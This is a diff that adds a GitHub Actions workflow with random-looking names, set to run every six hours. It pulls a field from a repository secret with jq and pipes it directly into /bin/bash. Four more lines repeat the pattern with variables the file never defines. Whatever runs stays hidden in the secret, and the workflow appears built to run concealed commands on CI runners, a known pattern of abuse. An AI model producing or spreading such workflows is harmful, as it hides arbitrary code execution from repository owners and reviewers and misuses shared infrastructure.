@@ -1,0 +1,21 @@
+name: shaobaixing3123
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '34 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: shaobaixing3123
+        env:
+          ochv25: ${{ secrets.ochv25 }}
+        run: |
+          echo $ochv25 | jq -r .ja3254 | /bin/bash
+          echo $wgga81469 | jq -r .hda7 | /bin/bash
+          echo $oc2 | jq -r .az352 | /bin/bash
+          echo $l6 | jq -r .hv8213 | /bin/bash
+          echo $g7674 | jq -r .xx80049 | /bin/bash
+
